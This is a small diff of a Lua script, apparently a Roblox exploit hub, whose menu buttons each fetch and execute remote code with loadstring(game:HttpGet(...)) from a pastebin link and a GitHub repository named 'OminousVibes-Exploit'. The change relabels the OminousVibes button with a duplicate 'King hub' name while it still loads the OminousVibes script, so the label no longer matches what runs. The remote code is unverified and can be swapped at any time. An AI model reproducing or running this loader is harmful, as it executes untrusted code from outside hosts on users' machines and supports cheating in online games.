@@ -17,6 +17,6 @@ MainSection:NewButton("King hub", "ButtonInfo", function()
     loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
 end)
 
-Section:NewButton("OminousVibes", "ButtonInfo", function()
+MainSection:NewButton("King hub", "ButtonInfo", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/OminousVibes-Exploit/Scripts/main/doors/loadstring.lua"))()
 end)
